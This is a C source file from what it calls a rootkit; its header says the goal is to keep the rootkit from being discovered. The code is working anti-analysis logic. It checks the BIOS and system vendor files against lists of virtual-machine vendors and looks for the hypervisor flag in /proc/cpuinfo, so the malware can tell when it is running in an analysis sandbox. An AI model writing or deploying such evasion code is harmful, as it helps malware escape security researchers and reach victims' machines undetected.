/**
 * @file anti.c
 * @author 0xff 
 * @brief We need to protect our rootkit from being discovered. 
 * @version 1.0
 * @date 2022-06-29
 * 
 * @copyright Copyright (c) 2022 0xff
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>. 
 */

#include "hide.h"

/* A few BIOS vendors. */

const char *bios_vendors[] = {
  "OVMF",
  "VMware",
  "VirtualBox",
  "Phoenix",
  "innotek"
};

/* A few sys vendors. */

const char *sys_vendors[] = {
  "QEMU",
  "VMware",
  "VirtualBox"
};

/**
 * @brief Checks the BIOS vendor.
 * 
 * @return true True if it's a VM.
 * @return false False if it's not a VM.
 */

bool vm_bios(void) {
  FILE *fp = fopen("/sys/class/dmi/id/bios_vendor", "r");
  char buf[64] = {0};

  if (!fp)
    exit(EXIT_FAILURE);

  fgets(buf, sizeof(buf), fp);

#ifdef DEBUG
  printf("[-] checking if the bios vendor is on our blacklist...\n");
#endif

  for (unsigned int i = 0; i < sizeof(bios_vendors) / sizeof(bios_vendors[0]); ++i)
    if (strstr(buf, bios_vendors[i])) {
#ifdef DEBUG
  printf("[-] bios vendor is blacklisted, exiting...\n");
#endif
      fclose(fp);
      return true;
    }

  fclose(fp);
  return false;
}

/**
 * @brief Checks the sys vendor.
 * 
 * @return true True if it's a VM.
 * @return false False if it's not a VM.
 */

bool vm_sys(void) {
  FILE *fp = fopen("/sys/class/dmi/id/sys_vendor", "r");
  char buf[64] = {0};

  if (!fp)
    exit(EXIT_FAILURE);
  
  fgets(buf, sizeof(buf), fp);

#ifdef DEBUG
  printf("[-] checking if the sys vendor is on our blacklist...\n");
#endif

  for (unsigned int i = 0; i < sizeof(sys_vendors) / sizeof(sys_vendors[0]); ++i)
    if (strstr(buf, sys_vendors[i])) {
#ifdef DEBUG
  printf("[-] sys vendor is blacklisted, exiting...\n");
#endif
      fclose(fp);
      return true;
    }
  
  fclose(fp);
  return false;
}

/**
 * @brief Checks if there's a hypervisor flag in /proc/cpuinfo.
 * 
 * @return true True if it's there.
 * @return false False if it's not.
 */

bool hypervisor_flag(void) {
  FILE *fp = fopen("/proc/cpuinfo", "r");
  char buf[BUFSIZ] = {0};

  if (!fp)
    exit(EXIT_FAILURE);

#ifdef DEBUG
  printf("[-] checking if the hypervisor flag is in /proc/cpuinfo...\n");
#endif

  while(fgets(buf, sizeof(buf), fp) != NULL)
    if (strstr(buf, "hypervisor")) {
#ifdef DEBUG
  printf("[-] detected flag, exiting...\n");
#endif
      fclose(fp);
      return true;
    }

  fclose(fp);
  return false;
}
